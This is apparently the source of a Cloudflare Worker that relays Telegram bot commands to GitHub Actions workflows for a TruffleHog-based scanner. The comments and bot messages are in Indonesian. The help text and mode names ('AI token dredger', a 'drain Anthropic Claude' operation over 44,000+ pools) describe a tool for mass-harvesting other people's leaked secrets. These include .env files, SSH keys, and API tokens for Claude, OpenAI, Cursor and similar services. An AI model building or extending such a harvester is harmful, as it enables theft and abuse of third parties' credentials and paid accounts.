/**
 * Cloudflare Worker: Telegram Webhook & Web API Dispatcher for TruffleHog (ciro-scan)
 *
 * Mendukung 3 Mode Operasi via Chat Telegram:
 * 1. Mode DORK  : /dork, /docker, dork, @dork -> Mencari repo berisi secret via GitHub Code Search
 * 2. Mode FEED  : /feed, feed, @feed, auto    -> Memindai repo dari user aktif event publik GitHub
 * 3. Mode TARGET: Paste URL repo Git (https://github.com/owner/repo)
 *                 Bisa ditambah opsi -bebas <kata_kunci> untuk pencarian string tertentu.
 *
 * Environment Variables / Secrets required in Cloudflare Worker:
 * - TELEGRAM_BOT_TOKEN : Token bot telegram (sama dengan GitHub Secret)
 * - GH_PAT             : GitHub Personal Access Token yang punya hak akses repo workflow
 * - GH_OWNER           : Akun GitHub (ciroxtreme)
 * - GH_REPO            : Nama repo (ciro-scan)
 * - ALLOWED_CHAT_ID    : ID Telegram Tuan Ciro (1936436999)
 */

export default {
  async fetch(request, env) {
    const url = new URL(request.url);

    // 1. Endpoint HTTP GET/POST sederhana untuk scan via web browser / curl (tanpa auth, permintaan Tuan Ciro)
    // Contoh: https://worker.dev/scan?url=dork
    //         https://worker.dev/scan?url=feed
    //         https://worker.dev/scan?url=https://github.com/target/repo
    if (url.pathname === "/scan") {
      const targetUrl = url.searchParams.get("url");
      const keyword = url.searchParams.get("keyword") || "";
      if (!targetUrl) {
        return new Response("Missing 'url' parameter. Gunakan ?url=dork, ?url=feed, atau ?url=https://github.com/user/repo\n", { status: 400 });
      }
      const triggered = await triggerGitHubScan(targetUrl, env, keyword);
      if (triggered.ok) {
        return new Response(`🚀 Scan berhasil dipicu untuk: ${targetUrl}. Pantau hasil di Telegram!\n`);
      } else {
        return new Response(`❌ Gagal trigger GitHub Actions: ${triggered.error}\n`, { status: 500 });
      }
    }

    // 2. Webhook Telegram Bot
    // Tuan Ciro bisa langsung kontrol via Telegram:
    // - /dork atau /docker
    // - /feed atau feed
    // - Paste URL repo (https://github.com/...)
    if (request.method === "POST") {
      try {
        const update = await request.json();
        const msg = update.message || update.edited_message;

        if (msg && msg.text) {
          const chatId = String(msg.chat.id);
          const rawText = msg.text.trim();
          const lowerText = rawText.toLowerCase();

          // Validasi keamanan: hanya proses chat dari Tuan Ciro (jika ALLOWED_CHAT_ID diset)
          if (env.ALLOWED_CHAT_ID && chatId !== String(env.ALLOWED_CHAT_ID)) {
            return new Response("Unauthorized", { status: 403 });
          }

          // --- MODE FAST DREDGER (AI CODING & LLM POOL) ---
          if (
            lowerText === "/fast" ||
            lowerText === "/dredge" ||
            lowerText === "/dredger" ||
            lowerText === "fast" ||
            lowerText === "dredge"
          ) {
            await sendTelegram(
              chatId,
              `⚡ <b>MEMICU FAST AI TOKEN DREDGER!</b>\n\n` +
              `🎯 <b>Target:</b> Claude Code, OpenAI/Codex, Cursor, Cline, Aider, Devin, Qwen, DeepSeek\n` +
              `🚀 <b>Mode:</b> Direct Raw HTTP Streamer (Nol Git Clone)\n` +
              `⏳ <i>Menghubungi runner GitHub Actions (dredger.yml)...</i>`,
              env
            );
            const res = await triggerGitHubWorkflow("dredger.yml", {}, env);
            if (!res.ok) {
              await sendTelegram(chatId, `❌ <b>Gagal memicu dredger:</b> <code>${esc(res.error)}</code>`, env);
            }
          }

          // --- MODE KURAS ANTHROPIC CLAUDE (DEEP SLICING) ---
          else if (
            lowerText === "/claude" ||
            lowerText === "/kuras" ||
            lowerText === "/kurasclaude" ||
            lowerText === "claude" ||
            lowerText === "kuras"
          ) {
            await sendTelegram(
              chatId,
              `🦅 <b>MEMICU OPERASI KURAS ANTHROPIC CLAUDE!</b>\n\n` +
              `🎯 <b>Target:</b> 44.000+ Kolam Anthropic Claude via Deep Slicing\n` +
              `🛡️ <b>Database:</b> Anti-duplikasi terpusat di branch <code>state</code>\n` +
              `⏳ <i>Menghubungi runner GitHub Actions (kuras_claude.yml)...</i>`,
              env
            );
            const res = await triggerGitHubWorkflow("kuras_claude.yml", {}, env);
            if (!res.ok) {
              await sendTelegram(chatId, `❌ <b>Gagal memicu kuras claude:</b> <code>${esc(res.error)}</code>`, env);
            }
          }

          // --- MODE 1: DORK HUNT ---
          if (
            lowerText === "/dork" ||
            lowerText.startsWith("/dork ") ||
            lowerText === "/docker" ||
            lowerText.startsWith("/docker ") ||
            lowerText === "dork" ||
            lowerText === "@dork" ||
            lowerText === "docker"
          ) {
            await sendTelegram(
              chatId,
              `🎣 <b>MEMICU DORK-HUNT SCAN!</b>\n\n` +
              `🌐 <b>Target:</b> GitHub Code Search Dorking\n` +
              `📡 <i>Memerintahkan runner mengendus file sensitif (.env, id_rsa, token)...</i>`,
              env
            );
            const res = await triggerGitHubScan("dork", env, "");
            if (!res.ok) {
              await sendTelegram(chatId, `❌ <b>Gagal memicu runner:</b> <code>${esc(res.error)}</code>`, env);
            }
          }

          // --- MODE 2: FEED GLOBAL ---
          else if (
            lowerText === "/feed" ||
            lowerText.startsWith("/feed ") ||
            lowerText === "feed" ||
            lowerText === "@feed" ||
            lowerText === "auto"
          ) {
            await sendTelegram(
              chatId,
              `🛰️ <b>MEMICU FEED-HUNT SCAN!</b>\n\n` +
              `📡 <b>Target:</b> 100 Repositori dari Event Publik GitHub Terbaru\n` +
              `⏳ <i>Runner sedang disiapkan di GitHub Actions...</i>`,
              env
            );
            const res = await triggerGitHubScan("feed", env, "");
            if (!res.ok) {
              await sendTelegram(chatId, `❌ <b>Gagal memicu runner:</b> <code>${esc(res.error)}</code>`, env);
            }
          }

          // --- MODE 3: DIRECT REPO URL (atau paste URL) ---
          else if (
            lowerText.startsWith("http://") ||
            lowerText.startsWith("https://") ||
            lowerText.startsWith("git@") ||
            lowerText.startsWith("github.com/")
          ) {
            let cleanText = rawText;
            if (cleanText.startsWith("github.com/")) {
              cleanText = "https://" + cleanText;
            }

            const parts = cleanText.split(/\s+/);
            const targetUrl = parts[0];
            let keyword = "";
            const flagIdx = parts.findIndex((p) => p.toLowerCase() === "-bebas");
            if (flagIdx !== -1 && parts[flagIdx + 1]) {
              keyword = parts.slice(flagIdx + 1).join(" ");
            }

            const modeInfo = keyword
              ? `🔍 <b>Mode:</b> Pencarian teks bebas <code>${esc(keyword)}</code>`
              : `🛡️ <b>Mode:</b> TruffleHog Secret Detection`;

            await sendTelegram(
              chatId,
              `🎯 <b>MEMICU SCAN REPOSITORI!</b>\n\n` +
              `📦 <b>Target:</b> <code>${esc(targetUrl)}</code>\n` +
              `${modeInfo}\n\n` +
              `⏳ <i>Menghubungi runner GitHub Actions...</i>`,
              env
            );

            const res = await triggerGitHubScan(targetUrl, env, keyword);
            if (!res.ok) {
              await sendTelegram(chatId, `❌ <b>Gagal memicu runner:</b> <code>${esc(res.error)}</code>`, env);
            }
          }

          // --- COMMAND /START & /HELP ---
          else if (lowerText === "/start" || lowerText === "/help") {
            const helpMsg =
              `🤖 <b>Security Scanner & AI Dredger Bot (@Dicopi_bot)</b>\n` +
              `━━━━━━━━━━━━━━━━━━━━━━\n\n` +
              `Tuan Ciro dapat menjalankan mode pemindaian langsung dari chat ini:\n\n` +
              `⚡ <b>1. Fast AI Dredger (Semua AI):</b>\n` +
              `Ketik <code>/fast</code> atau <code>/dredge</code>\n` +
              `<i>👉 Menyedot instan token Claude Code, OpenAI/Codex, Cursor, Cline, Aider, Devin, Qwen.</i>\n\n` +
              `🦅 <b>2. Operation Kuras Anthropic:</b>\n` +
              `Ketik <code>/claude</code> atau <code>/kuras</code>\n` +
              `<i>👉 Deep Slicing 44.000+ kolam Anthropic Claude (Anti-scan ulang).</i>\n\n` +
              `🎣 <b>3. Mode Dork (Code Search):</b>\n` +
              `Ketik <code>/dork</code> atau <code>/docker</code>\n` +
              `<i>👉 Mencari file sensitif (.env, id_rsa, token) di seluruh GitHub.</i>\n\n` +
              `🛰️ <b>4. Mode Feed Global:</b>\n` +
              `Ketik <code>/feed</code>\n` +
              `<i>👉 Audit repo publik developer yang baru aktif di GitHub.</i>\n\n` +
              `🎯 <b>5. Scan Target Repo Langsung:</b>\n` +
              `Paste link repo (contoh: <code>https://github.com/owner/repo</code>)\n` +
              `<i>(Bisa tambah <code>-bebas &lt;kata&gt;</code> untuk cari kata apa saja).</i>`;
            await sendTelegram(chatId, helpMsg, env);
          }

          // --- FORMAT TIDAK DIKENAL ---
          else {
            await sendTelegram(
              chatId,
              `💡 <b>Perintah tidak dikenali.</b>\n\n` +
              `Gunakan salah satu:\n` +
              `• <code>/dork</code> atau <code>/docker</code> untuk scan dork\n` +
              `• <code>/feed</code> untuk scan feed global\n` +
              `• Kirim link repo (<code>https://github.com/...</code>)\n` +
              `• Ketik <code>/help</code> untuk panduan lengkap.`,
              env
            );
          }
        }
      } catch (err) {
        console.error("Worker webhook error:", err);
      }
      return new Response("OK");
    }

    return new Response("Ciro TruffleHog Scanner Relay Worker Active! 🐷");
  }
};

function esc(s) {
  return String(s)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

async function triggerGitHubWorkflow(workflowFile, inputs, env) {
  const owner = env.GH_OWNER || "ciroxtreme";
  const repo = env.GH_REPO || "ciro-scan";
  const url = `https://api.github.com/repos/${owner}/${repo}/actions/workflows/${workflowFile}/dispatches`;

  try {
    const bodyPayload = { ref: "main" };
    if (inputs && Object.keys(inputs).length > 0) {
      bodyPayload.inputs = inputs;
    }
    const res = await fetch(url, {
      method: "POST",
      headers: {
        "Authorization": `Bearer ${env.GH_PAT}`,
        "Accept": "application/vnd.github.v3+json",
        "User-Agent": "Cloudflare-Worker-CiroScan"
      },
      body: JSON.stringify(bodyPayload)
    });

    if (res.status === 204) {
      return { ok: true };
    } else {
      const txt = await res.text();
      return { ok: false, error: `${res.status} - ${txt}` };
    }
  } catch (e) {
    return { ok: false, error: e.message };
  }
}

async function triggerGitHubScan(targetUrl, env, searchKeyword = "") {
  return triggerGitHubWorkflow("scan.yml", {
    target_url: targetUrl,
    search_keyword: searchKeyword || ""
  }, env);
}

async function sendTelegram(chatId, htmlText, env) {
  const token = env.TELEGRAM_BOT_TOKEN;
  if (!token) return;
  const url = `https://api.telegram.org/bot${token}/sendMessage`;
  try {
    await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: htmlText,
        parse_mode: "HTML",
        disable_web_page_preview: true
      })
    });
  } catch (err) {
    console.error("sendTelegram error:", err);
  }
}
